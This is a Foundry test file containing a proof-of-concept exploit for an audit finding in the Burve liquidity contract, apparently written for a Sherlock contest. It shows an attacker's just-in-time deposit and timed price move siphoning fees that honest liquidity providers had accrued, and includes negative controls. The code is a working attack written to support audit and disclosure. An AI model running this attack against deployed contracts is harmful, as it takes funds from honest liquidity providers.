// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";

// --- REAL audited Burve source (single/Burve.sol @ sherlock 2025-04-burve, commit 44cba36) ---
import {Burve} from "../src/single/Burve.sol";
import {TickRange} from "../src/single/TickRange.sol";
import {IStationProxy} from "../src/single/IStationProxy.sol";
// The real Uniswap math Burve uses to decide in/out-of-range token requirements.
import {LiquidityAmounts} from "../src/single/integrations/uniswap/LiquidityAmounts.sol";
import {TickMath} from "../src/single/integrations/uniswap/TickMath.sol";
import {IUniswapV3MintCallback} from "../src/single/integrations/kodiak/pool/IUniswapV3MintCallback.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

/*//////////////////////////////////////////////////////////////
        Minimal real ERC20 (opaque external token boundary)
//////////////////////////////////////////////////////////////*/
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amt) external { totalSupply += amt; balanceOf[to] += amt; }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt; return true;
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt; balanceOf[to] += amt; return true;
    }
}

/*//////////////////////////////////////////////////////////////
   Faithful minimal Uniswap V3 pool double (the opaque DEX venue).
   - amounts for mint/burn are computed with the REAL vendored
     Uniswap LiquidityAmounts + TickMath math, at a settable price
     (the "price" the attacker moves via a swap).
   - fee accrual is modeled as owed tokens on the position (the
     finding's stated external precondition: "accumulated fees on
     the other token"). Burve's collectV3Fees() poke+collect pulls
     them exactly as against a real pool.
   All of Burve's vulnerable logic runs unmodified against this venue.
//////////////////////////////////////////////////////////////*/
contract MockV3Pool {
    address public immutable token0;
    address public immutable token1;
    int24 public immutable tickSpacing;

    uint160 public sqrtPriceX96;
    int24 public tick;

    struct Position { uint128 liquidity; uint128 owed0; uint128 owed1; uint128 fee0; uint128 fee1; }
    mapping(bytes32 => Position) internal _pos;

    constructor(address t0, address t1, int24 spacing, uint160 sqrtP) {
        token0 = t0; token1 = t1; tickSpacing = spacing; _setPrice(sqrtP);
    }

    function _key(address o, int24 lo, int24 hi) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(o, lo, hi));
    }

    function setPrice(uint160 sqrtP) external { _setPrice(sqrtP); }
    function _setPrice(uint160 sqrtP) internal {
        sqrtPriceX96 = sqrtP; tick = TickMath.getTickAtSqrtRatio(sqrtP);
    }

    // Simulate fees earned by `owner`'s position from other traders' swap volume.
    function accrueFees(address owner, int24 lo, int24 hi, uint128 f0, uint128 f1) external {
        Position storage p = _pos[_key(owner, lo, hi)];
        p.fee0 += f0; p.fee1 += f1;
    }

    function slot0() external view
        returns (uint160, int24, uint16, uint16, uint16, uint32, bool)
    { return (sqrtPriceX96, tick, 0, 0, 0, 0, true); }

    function mint(address recipient, int24 lo, int24 hi, uint128 amount, bytes calldata data)
        external returns (uint256 amount0, uint256 amount1)
    {
        (amount0, amount1) = _amounts(lo, hi, amount, true);
        _pos[_key(recipient, lo, hi)].liquidity += amount;
        uint256 b0 = IERC20(token0).balanceOf(address(this));
        uint256 b1 = IERC20(token1).balanceOf(address(this));
        IUniswapV3MintCallback(msg.sender).uniswapV3MintCallback(amount0, amount1, data);
        require(IERC20(token0).balanceOf(address(this)) >= b0 + amount0, "M0");
        require(IERC20(token1).balanceOf(address(this)) >= b1 + amount1, "M1");
    }

    function burn(int24 lo, int24 hi, uint128 amount)
        external returns (uint256 amount0, uint256 amount1)
    {
        Position storage p = _pos[_key(msg.sender, lo, hi)];
        // uniswap "poke": burning 0 rolls accrued fees into owed balances
        p.owed0 += p.fee0; p.owed1 += p.fee1; p.fee0 = 0; p.fee1 = 0;
        if (amount > 0) {
            (amount0, amount1) = _amounts(lo, hi, amount, false);
            require(p.liquidity >= amount, "burn>liq");
            p.liquidity -= amount;
            p.owed0 += uint128(amount0); p.owed1 += uint128(amount1);
        }
    }

    function collect(address recipient, int24 lo, int24 hi, uint128 req0, uint128 req1)
        external returns (uint128 amount0, uint128 amount1)
    {
        Position storage p = _pos[_key(msg.sender, lo, hi)];
        amount0 = req0 > p.owed0 ? p.owed0 : req0;
        amount1 = req1 > p.owed1 ? p.owed1 : req1;
        p.owed0 -= amount0; p.owed1 -= amount1;
        if (amount0 > 0) IERC20(token0).transfer(recipient, amount0);
        if (amount1 > 0) IERC20(token1).transfer(recipient, amount1);
    }

    // ---- read surface used by Burve view/fee helpers (not on exploit path) ----
    function positions(bytes32 key) external view
        returns (uint128, uint256, uint256, uint128, uint128)
    { Position storage p = _pos[key]; return (p.liquidity, 0, 0, p.owed0, p.owed1); }
    function feeGrowthGlobal0X128() external pure returns (uint256) { return 0; }
    function feeGrowthGlobal1X128() external pure returns (uint256) { return 0; }
    function ticks(int24) external pure
        returns (uint128, int128, uint256, uint256, int56, uint160, uint32, bool)
    { return (0, 0, 0, 0, 0, 0, 0, false); }

    function _amounts(int24 lo, int24 hi, uint128 liq, bool roundUp)
        internal view returns (uint256, uint256)
    {
        return LiquidityAmounts.getAmountsForLiquidity(
            sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(lo),
            TickMath.getSqrtRatioAtTick(hi),
            liq,
            roundUp
        );
    }
}

/*//////////////////////////////////////////////////////////////
                              PoC
//////////////////////////////////////////////////////////////*/
contract PoC_56954_BurveJITFeeCapture is Test {
    // wide sqrt-price limits -> disables Burve's price-guard modifier
    uint160 internal constant LO_LIMIT = 1;
    uint160 internal constant HI_LIMIT = type(uint160).max;

    // single v3 range [-60, 60], tickSpacing 60
    int24 internal constant LO = -60;
    int24 internal constant HI = 60;
    int24 internal constant SPACING = 60;

    uint160 internal SP_MID;    // tick 0  (in range)
    uint160 internal SP_BELOW;  // tick -180 (below range -> only token0 usable, token1 fees stuck)
    uint160 internal SP_ABOVE;  // tick 180  (above range -> token1 usable, stuck fees compound)

    MockERC20 t0;
    MockERC20 t1;

    address alice = address(0xA11CE);   // honest LP present while fees accrue
    address bob   = address(0xB0B);      // attacker (JIT depositor)

    function setUp() public {
        SP_MID   = TickMath.getSqrtRatioAtTick(0);
        SP_BELOW = TickMath.getSqrtRatioAtTick(-180);
        SP_ABOVE = TickMath.getSqrtRatioAtTick(180);
    }

    // Deploy a fresh Burve wired to a fresh pool double, do the honest-LP setup
    // and seed the stuck token1 fees. Returns the wired system.
    function _deploy() internal returns (Burve burve, MockV3Pool pool) {
        t0 = new MockERC20("Token0", "T0");
        t1 = new MockERC20("Token1", "T1");
        pool = new MockV3Pool(address(t0), address(t1), SPACING, SP_MID);

        // deep external pool liquidity (other LPs) so above-range burns can be paid
        t0.mint(address(pool), 1_000_000e18);
        t1.mint(address(pool), 1_000_000e18);

        TickRange[] memory ranges = new TickRange[](1);
        ranges[0] = TickRange({lower: LO, upper: HI});
        uint128[] memory weights = new uint128[](1);
        weights[0] = 1;

        burve = new Burve(
            address(pool),
            address(0),               // no island
            address(0xDEAD),          // station proxy (unused: no island)
            ranges,
            weights
        );

        // fund + approve this test (deploys dead shares), alice, bob
        _fund(address(this), burve);
        _fund(alice, burve);
        _fund(bob, burve);

        // (1) dead-share first mint (required by Burve): recipient must be the pool wrapper
        burve.mint(address(burve), 1_000e18, LO_LIMIT, HI_LIMIT);

        // (2) honest LP alice provides a large position, in range
        vm.prank(alice);
        burve.mint(alice, 100_000e18, LO_LIMIT, HI_LIMIT);
    }

    function _fund(address who, Burve burve) internal {
        t0.mint(who, 10_000_000e18);
        t1.mint(who, 10_000_000e18);
        vm.startPrank(who);
        t0.approve(address(burve), type(uint256).max);
        t1.approve(address(burve), type(uint256).max);
        vm.stopPrank();
    }

    // Seed accumulated token1 fees that get stuck because the range is out of bounds.
    function _seedStuckFees(Burve burve, MockV3Pool pool, uint128 feeAmt1) internal {
        // fees earned by Burve's position from prior swap volume (external precondition)
        pool.accrueFees(address(burve), LO, HI, 0, feeAmt1);
        // pool must physically hold the fee tokens it will pay out on collect
        t1.mint(address(pool), feeAmt1);
        // price leaves the range downward -> only token0 usable, token1 fees cannot compound
        pool.setPrice(SP_BELOW);
    }

    /*//////////////////////////////////////////////////////////////
        MAIN: attacker JIT-deposits, times the range re-entry, and
        siphons a pro-rata slice of the stuck honest-LP fees.
    //////////////////////////////////////////////////////////////*/
    function test_attacker_capturesUnclaimedFees() public {
        (Burve burve, MockV3Pool pool) = _deploy();

        uint128 stuckFees1 = 100e18; // token1 fees earned while only honest LPs held shares
        _seedStuckFees(burve, pool, stuckFees1);

        // sanity: the fees really are stuck (a poke while out-of-range does NOT compound)
        uint128 tNLbeforePoke = burve.totalNominalLiq();
        // bob's own deposit is the poke that pulls the fees onto Burve as idle balance
        uint256 bobT0Before = t0.balanceOf(bob);
        uint256 bobT1Before = t1.balanceOf(bob);

        vm.prank(bob);
        uint256 bobShares = burve.mint(bob, 40_000e18, LO_LIMIT, HI_LIMIT);

        // idle fees now sit on Burve, NOT compounded into liquidity (still out of range)
        assertEq(burve.totalNominalLiq(), tNLbeforePoke + 40_000e18,
            "deposit-time compound must be gated: only bob's own liq added");
        assertApproxEqAbs(t1.balanceOf(address(burve)), stuckFees1, 2,
            "stuck token1 fees are idle on the contract, uncompounded");

        // fair (no-capture) baseline for bob's shares, valued at the withdraw price
        uint128 tNL0 = burve.totalNominalLiq();
        uint256 tS0  = burve.totalShares();
        uint128 fairLiq = uint128(FullMathLite.mulDiv(bobShares, tNL0, tS0));
        (, uint256 fairToken1) = LiquidityAmounts.getAmountsForLiquidity(
            SP_ABOVE, TickMath.getSqrtRatioAtTick(LO), TickMath.getSqrtRatioAtTick(HI), fairLiq, false
        );

        // ATTACK: push price up through the range (a large swap), re-entering the
        // usable zone, then immediately withdraw -> withdraw-time compound fires.
        pool.setPrice(SP_ABOVE);

        vm.prank(bob);
        burve.burn(bobShares, LO_LIMIT, HI_LIMIT);

        uint256 bobT1After = t1.balanceOf(bob);
        uint256 bobW1 = bobT1After - bobT1Before;             // token1 received on withdraw
        uint256 bobT0Spent = bobT0Before - t0.balanceOf(bob); // token0 paid on deposit

        // The compound DID fire on withdraw (stuck fees converted to liquidity)
        assertLt(t1.balanceOf(address(burve)), stuckFees1 / 100,
            "withdraw-time compound must consume the previously-stuck fees");

        // HARM: bob captured token1 fees strictly above his fair (base-liquidity) value.
        assertGt(bobW1, fairToken1, "attacker withdrew MORE than his fair share");
        uint256 skim = bobW1 - fairToken1;

        emit log_named_uint("stuck fees (token1)          ", stuckFees1);
        emit log_named_uint("bob token0 deposited         ", bobT0Spent);
        emit log_named_uint("bob token1 withdrawn         ", bobW1);
        emit log_named_uint("bob fair token1 (no capture) ", fairToken1);
        emit log_named_uint("bob SKIMMED fees (token1)    ", skim);
        emit log_named_uint("skim as bps of stuck fees    ", skim * 10_000 / stuckFees1);

        // bob was NOT an LP while the fees accrued yet captures a large slice of them.
        // his fair pro-rata share of totalShares is ~ 40k/(1k+100k+40k) ~ 28.4%.
        assertGt(skim, stuckFees1 / 5, "attacker siphoned >20% of honest-LP fees");
    }

    /*//////////////////////////////////////////////////////////////
        NEGATIVE CONTROL 1: same stuck fees, but bob does NOT time the
        range re-entry (withdraws while still out of range). No capture.
    //////////////////////////////////////////////////////////////*/
    function test_control_noTiming_noCapture() public {
        (Burve burve, MockV3Pool pool) = _deploy();
        _seedStuckFees(burve, pool, 100e18);

        uint256 bobT1Before = t1.balanceOf(bob);
        vm.prank(bob);
        uint256 bobShares = burve.mint(bob, 40_000e18, LO_LIMIT, HI_LIMIT);

        // bob does NOT move the price -> still out of range -> compound stays gated
        vm.prank(bob);
        burve.burn(bobShares, LO_LIMIT, HI_LIMIT);

        // bob withdrew in the SAME (below-range) state he entered: he gets token0 back,
        // essentially zero token1 -> no fee capture.
        uint256 bobW1 = t1.balanceOf(bob) - bobT1Before;
        emit log_named_uint("control token1 captured", bobW1);
        assertLt(bobW1, 1e15, "without timing the re-entry there is no fee capture");
    }

    /*//////////////////////////////////////////////////////////////
        NEGATIVE CONTROL 2 (honest-LP loss): identical fee setup and
        identical price path; the ONLY difference is bob's JIT presence.
        Alice's token1 out drops by exactly bob's skim.
    //////////////////////////////////////////////////////////////*/
    function test_honestLP_losesExactlyAttackerSkim() public {
        // ---- Scenario A: WITH attacker ----
        uint256 aliceOut_attack;
        uint256 bobSkim;
        {
            (Burve burve, MockV3Pool pool) = _deploy();
            _seedStuckFees(burve, pool, 100e18);

            uint256 bobT1Before = t1.balanceOf(bob);
            vm.prank(bob);
            uint256 bobShares = burve.mint(bob, 40_000e18, LO_LIMIT, HI_LIMIT);

            uint128 tNL0 = burve.totalNominalLiq();
            uint256 tS0  = burve.totalShares();
            uint128 fairLiq = uint128(FullMathLite.mulDiv(bobShares, tNL0, tS0));
            (, uint256 fairToken1) = LiquidityAmounts.getAmountsForLiquidity(
                SP_ABOVE, TickMath.getSqrtRatioAtTick(LO), TickMath.getSqrtRatioAtTick(HI), fairLiq, false
            );

            pool.setPrice(SP_ABOVE);
            vm.prank(bob);
            burve.burn(bobShares, LO_LIMIT, HI_LIMIT);
            bobSkim = (t1.balanceOf(bob) - bobT1Before) - fairToken1;

            // now alice exits at the same above-range price
            uint256 aliceShares = burve.balanceOf(alice);
            uint256 aBefore = t1.balanceOf(alice);
            vm.prank(alice);
            burve.burn(aliceShares, LO_LIMIT, HI_LIMIT);
            aliceOut_attack = t1.balanceOf(alice) - aBefore;
        }

        // ---- Scenario B: control, NO attacker (same fees, same price path) ----
        uint256 aliceOut_control;
        {
            (Burve burve, MockV3Pool pool) = _deploy();
            _seedStuckFees(burve, pool, 100e18);

            // someone still moves the price back into the usable zone (the market),
            // firing the compound; but no attacker JIT-deposit exists to dilute alice.
            pool.setPrice(SP_ABOVE);
            uint256 aliceShares = burve.balanceOf(alice);
            uint256 aBefore = t1.balanceOf(alice);
            vm.prank(alice);
            burve.burn(aliceShares, LO_LIMIT, HI_LIMIT);
            aliceOut_control = t1.balanceOf(alice) - aBefore;
        }

        emit log_named_uint("alice token1 out (no attacker)", aliceOut_control);
        emit log_named_uint("alice token1 out (attacked)   ", aliceOut_attack);
        assertGt(aliceOut_control, aliceOut_attack, "honest LP is diluted by the JIT attacker");
        uint256 aliceLoss = aliceOut_control - aliceOut_attack;
        emit log_named_uint("alice LOSS                    ", aliceLoss);
        emit log_named_uint("bob SKIM                      ", bobSkim);

        // the honest LP's loss is captured by the attacker (equal up to rounding/dead-share share)
        assertApproxEqRel(aliceLoss, bobSkim, 0.02e18, "attacker skim == honest-LP loss");
    }
}

// minimal 512-bit mulDiv for the test's fair-value computation
library FullMathLite {
    function mulDiv(uint256 a, uint256 b, uint256 d) internal pure returns (uint256) {
        return (a * b) / d; // values here are well within 256-bit range
    }
}
